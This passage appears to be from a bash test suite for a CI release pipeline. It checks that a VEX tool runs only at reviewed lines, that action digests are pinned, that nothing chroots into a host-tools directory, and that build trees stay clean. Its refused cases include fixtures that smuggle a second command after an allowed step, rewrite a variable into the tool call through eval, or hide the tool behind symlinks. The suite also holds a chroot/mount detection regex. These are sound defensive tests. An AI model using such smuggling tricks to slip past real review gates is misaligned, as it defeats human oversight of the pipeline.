vimok p7 "REQ-REL-010-AC4 a reviewed line is admitted at any indentation (strip) and repeated, as the real judge repeats it" $PW "$L1"$'\t\t"run": "bash bin/vex-index-test.sh </dev/null"\n'"$L2"
vim p2 "REQ-REL-010-AC4 the pin-wiring judge naming the tool itself (bin/vex-index.py) next to a reviewed line is refused" $PW '' "$L1"$'subprocess.run(["python3", "bin/vex-index.py", "layout"])\n'
vim p3 "REQ-REL-010-AC4 the pin-wiring judge naming the test script in any form that is not a reviewed line is refused" $PW '' $'x = "bash bin/vex-index-test.sh"\n'
vim p4 "REQ-REL-010-AC4 another test file holding a reviewed line is refused (the admission is for the pin-wiring judge only)" .github/judge/tests/other-test.sh '' "$L1"
vim p5 "REQ-REL-010-AC4 the pin-wiring judge with more words after the step string inside the same quotes is refused" $PW '' $'x = "bash bin/vex-index-test.sh </dev/null; echo more"\n'
vim p6 "REQ-REL-010-AC4 the pin-wiring judge naming the step string without its own quotes is refused" $PW '' $'x = bash bin/vex-index-test.sh </dev/null\n'
vim p8 "REQ-REL-010-AC4 adjacent string literals around the quoted step string handed to os.system are refused (round 2, seat A)" $PW '' $'os.system("bash bin/vex-index-test.sh </dev/null" " ")\n'
vim p9 "REQ-REL-010-AC4 the step string put in a variable that later lines rewrite to the tool and eval is refused (round 2, seat B)" $PW '' $'cmd="bash bin/vex-index-test.sh </dev/null"\ncmd=${cmd/#bash/python3}\ncmd=${cmd/-test.sh/.py}\neval "$cmd layout --layout /fixture"\n'
vim p10 "REQ-REL-010-AC4 a reviewed line with anything appended (a comment, a call) is refused" $PW '' "${L1%$'\n'}  # x"$'\n'
vim p11 "REQ-REL-010-AC4 a reviewed line with a call appended after it on the same line is refused" $PW '' "${L1%$'\n'}; os.system(x)"$'\n'
# the daily rescan (main-candidate-rescan.yml, cache#489, handoff 0521) attaches our OpenVEX to its own scratch copies of the candidates (never a published version): in THAT file, and only there, a line naming
# vex-index is admitted only if it is one of the reviewed lines (RESCAN_LINES, by sha256 of the stripped line)
RS=.github/workflows/main-candidate-rescan.yml
RSHEAD=$'jobs:\n  vex-attach:\n    steps:\n      - run: |\n'
R2=$'          python3 bin/vex-index.py layout --layout /tmp/layout/fixture-ours --vex /tmp/attach/selfcheck-ours.json\n'
R1=$'          python3 bin/vex-index.py verify-layout --layout /tmp/layout/fixture-ours --vex /tmp/attach/selfcheck-ours.json --base-digest "${before}"\n'
vimok r1 "REQ-REL-010-AC4 the daily rescan's reviewed vex-index lines (the fixture calls on a scratch layout), once each inside jobs.vex-attach, are admitted in main-candidate-rescan.yml only" $RS "$RSHEAD$R1$R2"
vim r2 "REQ-REL-010-AC5 the daily rescan naming vex-index in a line that is not a reviewed line (an attach to a published reference) is refused" $RS '' "$RSHEAD$R2"$'          python3 bin/vex-index.py attach ghcr.io/fosterstack/cache@sha256:0000000000000000000000000000000000000000000000000000000000000000\n'
vim r3 "REQ-REL-010-AC4 a reviewed rescan line with the layout changed to Build's images is refused" $RS '' "$RSHEAD"$'          python3 bin/vex-index.py layout --layout /tmp/oci/production --vex /tmp/attach/selfcheck-ours.json\n'
vim r4 "REQ-REL-010-AC4 a reviewed rescan line in another workflow file is refused" .github/workflows/other.yml '' "$RSHEAD$R2"
vim r8 "REQ-REL-010-AC5 a reviewed rescan line twice (once more than reviewed) is refused (cache#561 ruling: each admitted line exactly once)" $RS '' "$RSHEAD$R2$R2"
vim r9 "REQ-REL-010-AC5 a reviewed rescan line inside a job other than vex-attach is refused (R2 probe: the line steered at a published copy in scout-root-cause)" $RS '' "$RSHEAD$R2"$'  scout-root-cause:\n    steps:\n      - run: |\n'"$R1"
PT=bin/panel-wiring-test.sh
R3=$(printf '%s\n' '        if "vex-index" in att[0].get("run", ""):'); R3="$R3"$'\n'
vimok r5 "REQ-REL-010-AC4 the panel wiring test's reviewed lines that name the tool (its checks and one mutation fixture) are admitted in bin/panel-wiring-test.sh only" $PT "$R3"
vim r6 "REQ-REL-010-AC5 bin/panel-wiring-test.sh naming vex-index in a line that is not a reviewed line is refused" $PT '' "$R3"$'subprocess.run(["python3", "bin/vex-index.py", "attach", "ghcr.io/fosterstack/cache"])\n'
vim r7 "REQ-REL-010-AC4 the panel wiring test's reviewed needle line in another test file is refused" bin/other-wiring-test.sh '' "$R3"
# a link to the tool is the tool: refused wherever it sits
ld="$work/vim-link"; rm -rf "$ld"; mkdir -p "$ld/bin" "$ld/.github/workflows" "$ld/.github/policy"; cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$ld/bin/"
printf 'x\n' > "$ld/bin/vex-index.py"; ln -s vex-index.py "$ld/bin/attach.py"
if python3 -c 'import sys; exec(open(sys.argv[1]).read()); b = stray(sys.argv[2]); sys.exit(0 if any("attach.py" in x for x in b) else 1)' "$work/vi-named.py" "$ld"; then ok "REQ-REL-010-AC4 a link to the tool under another name is refused"; else bad "REQ-REL-010-AC4 a link to the tool under another name is refused"; fi
vim n2 "REQ-REL-010-AC4 re-running the tool from an alias of the allowed call's result (res.args[1]) is refused" bin/vex-live-test-test.sh '' $'\nres = vi_run; subprocess.run([sys.executable, res.args[1], "layout", "--layout", "/x"])\n'
vim n3 "REQ-REL-010-AC4 loading the tool in-process through an alias of the loader and of the call's result is refused" bin/vex-live-test-test.sh '' $'\nres = vi_run; f = load; M = f("m", res.args[1])\n'
vim n4 "REQ-REL-010-AC4 exec of the tool's source read from the allowed call's path is refused" bin/vex-live-test-test.sh '' $'\nres = vi_run; exec(compile(open(res.args[1]).read(), "t", "exec"), {"__name__": "t"})\n'
vim n12 "REQ-REL-010-AC4 any other use of the allowed call's result variable is refused" bin/vex-live-test-test.sh '' $'\nx = vi_run\n'
# a link to the tool under a prose directory at the top of the tree (docs/, test-evidence/) is the tool too
ld2="$work/vim-link2"; rm -rf "$ld2"; mkdir -p "$ld2/bin" "$ld2/docs" "$ld2/.github/workflows" "$ld2/.github/policy"; cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$ld2/bin/"
printf 'x\n' > "$ld2/bin/vex-index.py"; ln -s ../bin/vex-index.py "$ld2/docs/attach.md"
if python3 -c 'import sys; exec(open(sys.argv[1]).read()); b = stray(sys.argv[2]); sys.exit(0 if any("attach.md" in x for x in b) else 1)' "$work/vi-named.py" "$ld2"; then ok "REQ-REL-010-AC4 a link to the tool under the top-level docs/ is refused"; else bad "REQ-REL-010-AC4 a link to the tool under the top-level docs/ is refused"; fi
vim q1 "REQ-REL-010-AC4 the customer page, whose shell blocks the live test runs, is code like any other: a command naming the tool in it is refused" docs/using-our-vex.md '' $'\n```sh\n"$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout "$GITHUB_WORKSPACE/other-layout" --vex v.json\n```\n'
# the customer page as a link to another docs file that names the tool: the plan's open() follows the link, so the link is read through
ld3="$work/vim-link3"; rm -rf "$ld3"; mkdir -p "$ld3/bin" "$ld3/docs" "$ld3/.github/workflows" "$ld3/.github/policy"; cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$ld3/bin/"
printf '```sh\n"$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout x\n```\n' > "$ld3/docs/vex-guide-body.md"; ln -s vex-guide-body.md "$ld3/docs/using-our-vex.md"
if python3 -c 'import sys; exec(open(sys.argv[1]).read()); b = stray(sys.argv[2]); sys.exit(0 if "docs/using-our-vex.md" in b else 1)' "$work/vi-named.py" "$ld3"; then ok "REQ-REL-010-AC4 the customer page as a link to a file naming the tool is refused"; else bad "REQ-REL-010-AC4 the customer page as a link to a file naming the tool is refused"; fi
vim m6 "REQ-REL-010-AC4 the live-test run script without its one fixture call is refused (the exemption is not a blanket)" bin/vex-live-run.sh 'python3 "$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout scout-fixture --vex scout-fixture.vex.json >/dev/null || return 1' 'true'
# the runs rows: a row with no runs list is no runner, and a row of any other script that runs the tool is still one (Sign, Release, maintenance, patch release)
if python3 - "$work/vi-named.py" <<'PY'
import sys
exec(open(sys.argv[1]).read())
build = {"bin/build-stage-assemble.sh": {"runs": ["bin/vex-index.py"]}, "bin/loopback-get.sh": {}}
assert runners(build) == ["bin/build-stage-assemble.sh"]
for other in ("bin/release-sign.sh", "bin/stage-release.sh", "bin/build-stage-extra.sh", "bin/patch-release.sh"):
    assert runners({**build, other: {"runs": ["bin/vex-index.py"]}}) != ["bin/build-stage-assemble.sh"], other
PY
then ok "REQ-REL-010-AC4/AC5 a script row without a runs list is no runner of bin/vex-index.py, and a row of another script that runs it is still counted"
else bad "REQ-REL-010-AC4/AC5 the runs-row check on rows without runs or with a foreign runner"
fi
expect ok "005-AC5 the real release.yml chain jobs" "" graph "$root/.github/workflows/release.yml"
expect ok "AC14 the real scan.yml calls Build in snapshot mode and nothing else" "" callers "$root/.github/workflows/scan.yml"
expect ok "AC14 the real main-candidate-rescan.yml calls Build in snapshot mode and nothing else" "" callers "$root/.github/workflows/main-candidate-rescan.yml"
expect ok "AC11/005-AC6 the real Build and Rebuild assemble scripts agree and the real stage files do not name apko" "" lockflow \
       "$root/bin/build-stage-assemble.sh" "$root/bin/build-stage-rebuild-assemble.sh" "$root/.github/workflows/stage-build.yml" \
       "$root/.github/workflows/stage-reproducibility.yml"
expect ok "AC1 the real workflow directory: no file added beyond stage-sign.yml, stage-image.yml and stage-admission.yml gone (rules 50, 52, 61)" "" \
       workflows "$root/.github/workflows"
# take 15 (Codex PR 421): the four chain stage files pin download-artifact to ONE digest, and that digest is on the action allowlist; a bump that reached some of them (the Dependabot bump of main's #402 did all four) leaves two digests in one chain
python3 - "$root" <<'PY' && ok "the four chain stage files (build, reproducibility, verify, promote) pin download-artifact and upload-artifact each to one and the same digest, which .github/policy/allowed-actions.json lists" || bad "the chain stage files pin download-artifact to different digests, or to one the allowlist does not list"
import json, re, sys
root = sys.argv[1]
found = set()
for action in ("download-artifact", "upload-artifact"):
    found = set()
    for f in ("stage-build", "stage-reproducibility", "stage-verify", "stage-promote"):
        found |= set(re.findall(r"actions/" + action + r"@([0-9a-f]{40})", open("%s/.github/workflows/%s.yml" % (root, f)).read()))
    allowed = {a for a in json.load(open(root + "/.github/policy/allowed-actions.json"))["actions"] if a.startswith("actions/" + action + "@")}
    assert len(found) == 1, "stage files pin %d different %s digests: %s" % (len(found), action, sorted(found))
    assert "actions/" + action + "@" + next(iter(found)) in allowed, "the pinned %s digest is not on the allowlist" % action
PY
# AC17 (the absolute symlink ruling): the unpacked host-tools root is only ever USED by the wrapper (the extracted loader run with --library-path); no script or stage file
# chroots into it, bind-mounts it, pivots into it or hands it to bwrap/unshare as a root, so an absolute link inside it (etc/mtab -> /proc/mounts) is never resolved against the host
python3 - "$root" <<'PY' && ok "AC17 nothing chroots into, bind-mounts or pivots into the host-tools root (and an absolute link is never created in it)" || bad "AC17 something chroots into, bind-mounts or pivots into the host-tools root"
import glob, re, sys
root = sys.argv[1]
files = sorted(glob.glob(root + "/.github/workflows/stage-*.yml") + glob.glob(root + "/bin/build-stage-*.sh") + [root + "/bin/install-host-bwrap.py"])
assert len(files) >= 6, "too few files scanned: %s" % files
used = 0
for f in files:
    for i, line in enumerate(open(f).read().splitlines(), 1):
        if "host-tools" in line and not line.lstrip().startswith("#"):
            used += 1
            bad = re.search(r"chroot|pivot_root|nsenter|--bind|--ro-bind|--dev-bind|--overlay|\bmount\b|--root-bind|unshare", line)
            assert not bad, "%s:%d uses the host-tools root as a root or mount (%s)" % (f, i, bad.group(0))
assert used >= 3, "the scan found no use of the host-tools root"
PY
# REQ-CHAIN-004 (the binary says neither (devel) nor vcs.modified=true): the job's own directories (archive/, host-tools/, out/, witness-apk/,
# admission.json) are untracked in the checkout melange copies, and Go stamps vcs.modified=true for any untracked file. the marked block of bin/build-apk.sh keeps
# exactly those nine paths out of git's view (Build: archive/ host-tools/ out/ witness-apk/ admission.json; Rebuild: build-in/ witness-build/ witness-rapk/ policy.json) (the job-local .git/info/exclude, never committed); the recipe check and build-apk.sh stay strict.
TREE=$(mktemp -d)/tree.sh
{ echo 'GIT=git; set -eu'; echo 'die() { echo "$1" >&2; exit "${2:-1}"; }'; echo 'src=$1'; echo 'PY3=/usr/bin/python3'; sed -n '/^# tree-exclude begin$/,/^# tree-exclude end$/p' bin/build-apk.sh; } > "$TREE"
tree_repo() { local d; d=$(mktemp -d); ( cd "$d" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i
  mkdir archive host-tools out witness-apk && for f in archive host-tools out witness-apk; do echo x > "$f/f"; done; echo '{}' > admission.json ); echo "$d"; }
d=$(tree_repo)
[ -n "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: the job's directories make the tree dirty without the block (the cause of vcs.modified=true)" || bad "REQ-BUILDAPK-001-AC4 tree: the cause did not reproduce"
trc=127; if [ -f "$TREE" ]; then trc=0; bash "$TREE" "$d" > /dev/null 2>&1 || trc=$?; fi
[ "$trc" = 0 ] && ok "REQ-BUILDAPK-001-AC4 tree: the block runs in a git checkout (exit 0)" || bad "REQ-BUILDAPK-001-AC4 tree: the block did not run (exit $trc)"
[ -z "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: with the block the job paths no longer dirty the tree" || bad "REQ-BUILDAPK-001-AC4 tree: the tree is still dirty after the block: $(git -C "$d" status --porcelain | tr '\n' ' ')"
if [ -f "$TREE" ]; then bash "$TREE" "$d" > /dev/null 2>&1; fi
[ "$(grep -c . "$d/.git/info/exclude")" = "$(sort -u "$d/.git/info/exclude" | grep -c .)" ] && ok "REQ-BUILDAPK-001-AC4 tree: running the block twice adds no line twice" || bad "REQ-BUILDAPK-001-AC4 tree: the block is not idempotent"
echo s > "$d/stray.go"; [ -n "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: a stray untracked file still makes the tree dirty" || bad "REQ-BUILDAPK-001-AC4 tree: a stray file is hidden"
rm "$d/stray.go"; mkdir -p "$d/pkg/archive" && echo s > "$d/pkg/archive/x.go"; [ -n "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: a nested archive/ below the root still makes the tree dirty (the exclusions are anchored)" || bad "REQ-BUILDAPK-001-AC4 tree: a nested archive/ is hidden"
rm -r "$d/pkg"; echo b >> "$d/tracked"; [ -n "$(git -C "$d" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: a modified tracked file still makes the tree dirty" || bad "REQ-BUILDAPK-001-AC4 tree: a modified tracked file is hidden"
n=$(mktemp -d); nrc=0; if [ -f "$TREE" ]; then bash "$TREE" "$n" > /dev/null 2>&1 || nrc=$?; fi
[ "$nrc" = 1 ] && [ -z "$(ls -A "$n")" ] && ok "REQ-BUILDAPK-001-AC4 tree: outside a git checkout the block refuses (exit 1) and writes nothing" || bad "REQ-BUILDAPK-001-AC4 tree: outside a git checkout the block did not refuse with exit 1 and write nothing (exit $nrc)"
r=$(mktemp -d); ( cd "$r" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i
  mkdir build-in witness-build witness-rapk && for f in build-in witness-build witness-rapk; do echo x > "$f/f"; done; echo '{}' > policy.json; mkdir archive out witness-apk host-tools; echo x > archive/f; echo x > out/f; echo x > witness-apk/f; echo x > host-tools/f; echo '{}' > admission.json )
[ -n "$(git -C "$r" status --porcelain)" ] && bash "$TREE" "$r" > /dev/null 2>&1 && [ -z "$(git -C "$r" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: a Rebuild-shaped checkout (build-in/, witness-build/, witness-rapk/, policy.json beside the Build paths) is clean after the block" || bad "REQ-BUILDAPK-001-AC4 tree: a Rebuild-shaped checkout is still dirty after the block: $(git -C "$r" status --porcelain | tr '\n' ' ')"
f=$(mktemp -d); ( cd "$f" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i && mkdir archive && echo x > archive/f && printf '# local excludes' > .git/info/exclude )
bash "$TREE" "$f" > /dev/null 2>&1; [ -z "$(git -C "$f" status --porcelain)" ] && [ "$(head -1 "$f/.git/info/exclude")" = "# local excludes" ] && ok "REQ-BUILDAPK-001-AC4 tree: an exclude file with no final newline keeps its last line and still takes the patterns" || bad "REQ-BUILDAPK-001-AC4 tree: an exclude file with no final newline swallowed a pattern: $(head -3 "$f/.git/info/exclude" | tr '\n' '|')"
g=$(mktemp -d); ( cd "$g" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i && mkdir out && echo x > out/f && printf ' /out/\n' > .git/info/exclude )
bash "$TREE" "$g" > /dev/null 2>&1; [ -z "$(git -C "$g" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: an exclude holding ' /out/' (a different pattern to git) is not taken for /out/, and the tree ends clean" || bad "REQ-BUILDAPK-001-AC4 tree: an exclude holding ' /out/' left the tree dirty: $(git -C "$g" status --porcelain | tr '\n' ' ')"
m=$(mktemp -d); ( cd "$m" && git init -q && git config user.email t@t && git config user.name t && echo a > tracked && git add tracked && git commit -qm i && mkdir archive && echo x > archive/f && rm -rf .git/info )
bash "$TREE" "$m" > /dev/null 2>&1; [ -z "$(git -C "$m" status --porcelain)" ] && ok "REQ-BUILDAPK-001-AC4 tree: with .git/info removed the block makes it and the tree ends clean" || bad "REQ-BUILDAPK-001-AC4 tree: with .git/info removed the tree is dirty or the block failed: $(git -C "$m" status --porcelain | tr '\n' ' ')"
n=$(mktemp -d); ( cd "$n" && git init -q && rm -rf .git/info && echo x > .git/info )
nrc=0; nerr=$(bash "$TREE" "$n" 2>&1 >/dev/null) || nrc=$?
[ "$nrc" = 1 ] && case "$nerr" in *"the exclude file"*) true ;; *) false ;; esac && ok "REQ-BUILDAPK-001-AC4 tree: with .git/info a regular file the block exits 1 and names the exclude file" || bad "REQ-BUILDAPK-001-AC4 tree: with .git/info a regular file the block did not exit 1 naming the exclude file (rc=$nrc: $nerr)"
python3 - << 'PY' && ok "REQ-BUILDAPK-001-AC4 tree: build-apk.sh holds the exclusion block once, before the sealed melange call" || bad "REQ-BUILDAPK-001-AC4 tree: the exclusion block is missing, repeated or after the sealed melange call"
t = open("bin/build-apk.sh").read().splitlines()
b = [i for i, l in enumerate(t) if l == "# tree-exclude begin"]
e = [i for i, l in enumerate(t) if l == "# tree-exclude end"]
m = [i for i, l in enumerate(t) if l.startswith('melange_bin=')]
assert len(b) == 1 and len(e) == 1 and b[0] < e[0] < m[0]
PY
# the whole refusal, branch and exit included: a recipe that warns and goes on must stay red
refusal_block=$(cat <<'BLOCK'
      if grep -Eq '\(devel\)|vcs.modified=true' ${{targets.destdir}}/usr/share/fscache/buildinfo.txt; then
        cat ${{targets.destdir}}/usr/share/fscache/buildinfo.txt
        echo 'the binary says (devel) or vcs.modified=true' >&2
        exit 1
      fi
BLOCK
)
has_refusal_block() {
  python3 -I -c 'import sys; sys.exit(0 if sys.argv[1] in open(sys.argv[2]).read() else 1)' "$refusal_block" "$1"
}
# AC4 ruling (Oct 30): the two refusals moved into build-apk-helper.py check-buildinfo; fixed strings, whole lines
CBI='"$PY3" -I -B bin/build-apk-helper.py check-buildinfo "$tmp/buildinfo.txt" "$version"'
if grep -Fxq "$CBI" bin/build-apk.sh \
  && grep -Fxq '    if "(devel)" in text:' bin/build-apk-helper.py \
  && grep -Fxq '        raise Refused("the binary says (devel): the source was not stamped", 1)' bin/build-apk-helper.py \
  && grep -Fxq '    if "vcs.modified=true" in text:' bin/build-apk-helper.py \
  && grep -Fxq '        raise Refused("the binary was built from a modified (dirty) tree (vcs.modified=true)", 1)' bin/build-apk-helper.py \
  && has_refusal_block build/melange.yaml && has_refusal_block build/melange-fips.yaml; then
  msg="REQ-BUILDAPK-001-AC4 tree: the dirty-tree check is still in place"
  ok "$msg (the check-buildinfo call line in build-apk.sh, the helper's (devel) and vcs.modified refusals) and in each of the two recipes"
else
  bad "REQ-BUILDAPK-001-AC4 tree: a dirty-tree check line was removed or changed"
fi
EXPECT=1254
echo "pass=$pass fail=$failn"
if [ "$EXPECT" != 0 ] && [ $((pass + failn)) != "$EXPECT" ]; then
  echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1
fi
[ "$failn" = 0 ]
